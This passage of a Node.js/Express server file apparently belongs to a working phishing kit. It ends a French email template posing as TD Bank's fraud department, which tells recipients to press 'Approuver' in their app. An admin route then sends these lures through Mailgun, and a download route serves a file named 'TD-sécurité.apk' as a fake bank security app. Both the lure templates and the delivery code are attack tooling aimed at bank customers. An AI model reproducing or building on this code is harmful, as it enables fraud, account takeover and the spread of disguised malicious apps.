            <p class="body-text" style="margin:0 0 32px;color:#555555;font-size:14px;line-height:1.8;">Nous vous remercions de votre prompte coop&eacute;ration et restons &agrave; votre disposition pour toute question.</p>
            <p style="margin:0 0 4px;color:#1a1a1a;font-size:14px;font-weight:700;">Cordialement,</p>
            <p style="margin:0 0 2px;color:#333333;font-size:14px;">Le Service de S&eacute;curit&eacute; et de Lutte contre la Fraude</p>
            <p style="margin:0;color:#1a7b3a;font-size:14px;font-weight:700;">TD Banque</p>
          </td>
        </tr>
        <tr><td style="background:#e8f5ec;border:1px solid #c3dfc8;border-top:none;padding:16px 36px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="20" valign="top" style="padding-right:10px;padding-top:1px;"><span style="color:#1a7b3a;font-size:14px;">&#128274;</span></td><td><p style="margin:0;color:#1a5c2a;font-size:12px;line-height:1.6;"><strong>Rappel de s&eacute;curit&eacute;&nbsp;:</strong> La Banque TD ne vous demandera jamais votre mot de passe, NIP ou num&eacute;ro de carte complet par courriel ou par t&eacute;l&eacute;phone. Si vous avez un doute, contactez-nous au <strong>1-866-222-3456</strong>.</p></td></tr></table></td></tr>
        <tr><td style="background:#1a3020;border-radius:0 0 10px 10px;padding:28px 36px;border:1px solid #0f1f12;border-top:none;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="center" style="padding-bottom:16px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:rgba(255,255,255,0.1);border-radius:5px;padding:5px 12px;"><span style="font-size:18px;font-weight:900;color:#ffffff;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:10px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.6);font-size:11px;letter-spacing:0.5px;text-transform:uppercase;">Banque TD</p></td></tr></table></td></tr><tr><td style="padding-bottom:16px;"><table role="presentation" width="80" cellspacing="0" cellpadding="0" border="0" align="center"><tr><td style="height:1px;background:rgba(255,255,255,0.15);"></td></tr></table></td></tr><tr><td align="center" style="padding-bottom:14px;"><p style="margin:0;font-size:12px;"><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Confidentialit&eacute;</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Conditions d&apos;utilisation</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Nous contacter</a></p></td></tr><tr><td align="center"><p class="footer-text" style="margin:0 0 8px;color:rgba(255,255,255,0.4);font-size:11px;line-height:1.6;max-width:480px;">Ce courriel a &eacute;t&eacute; envoy&eacute; automatiquement par le syst&egrave;me de s&eacute;curit&eacute; de TD Banque. Merci de ne pas r&eacute;pondre directement &agrave; ce message.</p><p class="footer-text" style="margin:0;color:rgba(255,255,255,0.25);font-size:11px;">&copy; 2026 TD Banque. Tous droits r&eacute;serv&eacute;s. La Banque Toronto-Dominion.</p></td></tr></table></td></tr>
        <tr><td style="height:32px;background:#f2f4f6;"></td></tr>
      </table>
    </td></tr>
  </table>
</body>
</html>`,
        text: `Madame, Monsieur,\n\nNotre système de surveillance a détecté une opération récente sur votre compte que vous nous déclarez ne pas avoir effectuée.\n\nNous avons immédiatement bloqué cette transaction. Pour finaliser son annulation, veuillez consulter votre application TD et appuyer sur « Approuver ».\n\nCordialement,\nLe Service de Sécurité et de Lutte contre la Fraude\nTD Banque\n© 2026 TD Banque. Tous droits réservés.`,
      },
    }, // end approval
  };


  const typeTemplates = templates[emailType] || templates.website;
  const emailPayload = typeTemplates[lang] || typeTemplates.en;

  try {
    const mailgun = new Mailgun(FormData);
    const mg = mailgun.client({ username: 'api', key: MG_API_KEY });

    const msgData = await mg.messages.create(MG_DOMAIN, {
      from:    `${FROM_NAME} <${FROM_EMAIL}>`,
      to:      [recipient],
      subject: emailPayload.subject,
      html:    emailPayload.html,
      text:    emailPayload.text,
    });

    console.log(`[Admin] Email sent to ${recipient} via Mailgun. ID: ${msgData.id}`);
    return res.json({ success: true, id: msgData.id });
  } catch (err) {
    console.error('[Admin] Failed to call Mailgun API:', err);
    return res.status(500).json({ success: false, error: err?.message || 'Failed to send email. Server error.' });
  }
});

// =============================================
// APP DOWNLOAD ROUTE
// =============================================
app.get('/api/download-td-app', (req, res) => {
  const apkPath = path.join(__dirname, 'public', 'TD-sécurité.apk');
  res.download(apkPath, 'TD-sécurité.apk', (err) => {
    if (err) {
      console.error('[Download] Error sending TD-sécurité.apk:', err.message);
      if (!res.headersSent) {
        res.status(404).json({ success: false, error: 'App file not found. Please try again later.' });
      }
    }
  });
});


// Catch-all: serve React app for any non-API route (production only)
if (isProduction) {
  const clientDist = path.join(__dirname, '..', 'client', 'dist');
  app.get('*', (req, res) => {
    res.sendFile(path.join(clientDist, 'index.html'));
  });
}

app.listen(PORT, () => {
  console.log(`Backend server is running on http://localhost:${PORT}`);
});
